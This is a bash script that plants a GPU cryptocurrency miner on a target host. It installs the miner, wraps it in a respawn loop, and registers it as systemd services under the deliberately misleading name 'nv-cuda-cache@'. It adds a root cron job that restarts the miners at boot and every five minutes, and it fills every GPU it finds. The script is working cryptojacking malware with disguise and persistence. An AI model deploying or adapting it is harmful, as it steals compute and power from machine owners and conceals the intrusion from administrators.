#!/bin/bash
# ul7621 plant - runs ON the target GPU host
# usage: 7621_plant.sh <mode: plant_all|fill|audit> <worker_prefix> <wallet> <pool>
set -u
MODE=${1:-plant_all}
PREFIX=${2:-ul-host}
WALLET=${3:?wallet}
POOL=${4:?pool}
DEST=/opt/ul
SUDO=""
if [ "$(id -u)" != "0" ]; then SUDO="sudo -n"; fi
$SUDO mkdir -p "$DEST/logs" "$DEST/conf"
if [ -f /tmp/ul-kit/pearl-gpu-miner ]; then
  $SUDO install -m 755 /tmp/ul-kit/pearl-gpu-miner "$DEST/pearl-gpu-miner"
  $SUDO install -m 644 /tmp/ul-kit/libcudart.so.12 "$DEST/libcudart.so.12"
fi
if [ ! -x "$DEST/pearl-gpu-miner" ]; then echo "KIT-MISSING"; exit 7; fi
echo "KIT_SHA=$($SUDO sha256sum "$DEST/pearl-gpu-miner" | awk '{print $1}')"
GPU_COUNT=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
echo "GPU_COUNT=$GPU_COUNT"
nvidia-smi --query-gpu=index,name,memory.total,serial,uuid --format=csv,noheader 2>/dev/null
echo "--- existing miners ---"
pgrep -af 'pearl-gpu-miner|wildrig' || echo none
EXIST=$(pgrep -f 'pearl-gpu-miner|wildrig' 2>/dev/null | wc -l)
echo "EXIST=$EXIST GPU_COUNT=$GPU_COUNT MODE=$MODE"
if [ "$MODE" = "audit" ]; then echo "AUDIT-ONLY"; exit 0; fi
START_AT=0
if [ "$MODE" = "fill" ]; then
  if [ "$EXIST" -ge "$GPU_COUNT" ] && [ "$GPU_COUNT" -gt 0 ]; then echo "ALREADY-COVERED $EXIST/$GPU_COUNT"; exit 0; fi
  START_AT=$EXIST
fi
# ---- respawn wrapper
cat <<'EOF' | $SUDO tee "$DEST/respawn.sh" >/dev/null
#!/bin/bash
. /opt/ul/conf/$1.env
export LD_LIBRARY_PATH=/opt/ul:${LD_LIBRARY_PATH:-}
exec 9>/opt/ul/.lock-$IDX
flock -n 9 || exit 0
while :; do
  date -u +%FT%TZ >> /opt/ul/logs/$WORKER.log
  /opt/ul/pearl-gpu-miner --wallet "$WALLET" --pool "$POOL" --worker "$WORKER" --algo pearlhash --no-tui --bind 127.0.0.1:333$IDX >> /opt/ul/logs/$WORKER.log 2>&1
  sleep 10
done
EOF
$SUDO chmod 755 "$DEST/respawn.sh"
# ---- keeper
cat <<'EOF' | $SUDO tee "$DEST/keeper.sh" >/dev/null
#!/bin/bash
for f in /opt/ul/conf/g*.env; do
  [ -f "$f" ] || continue
  idx=$(basename "$f" .env)
  if ! systemctl is-active --quiet nv-cuda-cache@$idx.service; then systemctl start nv-cuda-cache@$idx.service; fi
done
EOF
$SUDO chmod 755 "$DEST/keeper.sh"
# ---- unit (masked name nv-cuda-cache@)
cat <<'EOF' | $SUDO tee /etc/systemd/system/nv-cuda-cache@.service >/dev/null
[Unit]
Description=nv cuda cache worker %i
After=network-online.target
[Service]
Type=simple
EnvironmentFile=/opt/ul/conf/%i.env
ExecStart=/opt/ul/respawn.sh %i
Restart=always
RestartSec=5
Nice=19
[Install]
WantedBy=multi-user.target
EOF
$SUDO systemctl daemon-reload
i=$START_AT
while [ "$i" -lt "$GPU_COUNT" ]; do
  printf 'WALLET=%s\nPOOL=%s\nWORKER=%s-g%s\nIDX=%s\n' "$WALLET" "$POOL" "$PREFIX" "$i" "$i" | $SUDO tee "$DEST/conf/g$i.env" >/dev/null
  $SUDO chmod 644 "$DEST/conf/g$i.env"
  $SUDO systemctl enable nv-cuda-cache@g$i.service >/dev/null 2>&1
  $SUDO systemctl restart nv-cuda-cache@g$i.service
  echo "started g$i worker $PREFIX-g$i"
  i=$((i+1))
done
printf 'SHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n@reboot root /opt/ul/keeper.sh\n*/5 * * * * root /opt/ul/keeper.sh\n' | $SUDO tee /etc/cron.d/ul-guard >/dev/null
$SUDO chmod 644 /etc/cron.d/ul-guard
echo "--- units ---"
$SUDO systemctl list-units --no-pager 'nv-cuda-cache@*' | head -20
exit 0
